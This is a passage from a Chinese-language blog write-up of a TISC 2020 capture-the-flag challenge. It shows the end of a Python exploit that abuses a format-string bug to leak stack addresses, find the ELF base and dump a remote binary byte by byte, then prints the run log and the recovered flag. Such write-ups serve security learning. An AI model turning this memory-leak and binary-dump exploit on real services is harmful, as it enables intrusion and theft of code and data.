    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got value of index 39: 0x%x"</span> <span class="token operator">%</span> index_39_value<span class="token punctuation">)</span>

    <span class="token comment"># Leak address of the format string just to verify.</span>
    index_4_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 4 (format string): 0x%x"</span> <span class="token operator">%</span> index_4_value<span class="token punctuation">)</span>

    <span class="token comment"># Leak address of possible .text.</span>
    index_7_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 7 (format string): 0x%x"</span> <span class="token operator">%</span> index_7_value<span class="token punctuation">)</span>
    elf_start <span class="token operator">=</span> index_7_value <span class="token operator">&amp;</span> <span class="token number">0xffffffffffffe000</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ELF Start: 0x%x"</span> <span class="token operator">%</span> elf_start<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> arbitrary_read<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> address<span class="token punctuation">)</span>

    elf_header <span class="token operator">=</span> leak<span class="token punctuation">(</span>elf_start<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ELF Start Bytes: %s"</span> <span class="token operator">%</span> elf_header<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token string">b'\x7fELF\x02\x01\x01'</span> <span class="token operator">!=</span> elf_header<span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Attempt failed.'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    elf_contents <span class="token operator">=</span> elf_header <span class="token operator">+</span> <span class="token string">b'\x00'</span>
    offset <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span>
    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stolen_elf"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span>
    running_index <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            next_content <span class="token operator">=</span> leak<span class="token punctuation">(</span>elf_start <span class="token operator">+</span> offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span>
            elf_contents <span class="token operator">+=</span> next_content
            offset <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>next_content<span class="token punctuation">)</span>
            <span class="token comment">#print(offset, next_content)</span>
            fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>next_content<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">b'TISC20'</span> <span class="token keyword">in</span> next_content<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> next_content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
                log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'Discovered flag: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">100</span> <span class="token operator">></span> running_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>
                log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got &#123;&#125; bytes of ELF data so far."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                running_index <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got EOF, leaked all we could."</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Obtained &#123;&#125; bytes of ELF file."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Flag: &#123;&#125;."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>当脚本能成功运行时，检测到ELF头文件，转存为ELF二进制文件。经过很长时间的运行，最终得到falg： </p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python exploit6.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port <span class="token number">42000</span>: Done
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">38</span>: 0x7ffca01db940
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> RSP <span class="token punctuation">(</span>index <span class="token number">0</span><span class="token punctuation">)</span>: 0x7ffca01db810
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">26</span> <span class="token punctuation">(</span>index <span class="token number">39</span><span class="token punctuation">)</span>: 0x7ffca01db948
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got value of index <span class="token number">39</span>: 0x7ffca01dcf5c
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">4</span> <span class="token punctuation">(</span>format string<span class="token punctuation">)</span>: 0x5557a54680a0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">7</span> <span class="token punctuation">(</span>format string<span class="token punctuation">)</span>: 0x5557a54652e0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ELF Start: 0x5557a5464000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ELF Start Bytes: b<span class="token string">'<span class="token entity" title="\x7f">\x7f</span>ELF<span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x01">\x01</span>'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">9</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">101</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">201</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">301</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">402</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">501</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">602</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">701</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">820</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">902</span> bytes of ELF data so far.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">1001</span> bytes of ELF data so far.
<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">16401</span> bytes of ELF data so far.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Discovered flag: TISC20<span class="token punctuation">&#123;</span>Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938<span class="token punctuation">&#125;</span>
<span class="token punctuation">..</span>.</code></pre>

<p><strong>Flag:</strong> <code>TISC20&#123;Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938&#125;</code></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-09%E9%AB%98%E6%96%AF%E6%B7%B7%E5%90%88%E5%88%86%E5%B8%83/">
                        <span class="hidden-mobile">机器学习手推笔记_09高斯混合分布</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            Page View 
            <span id="busuanzi_value_site_pv"></span>
             
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            Unique Visitor 
            <span id="busuanzi_value_site_uv"></span>
             
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  
    
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "TISC 2020 CTF 题目分析及writeups&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":170,"height":340},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
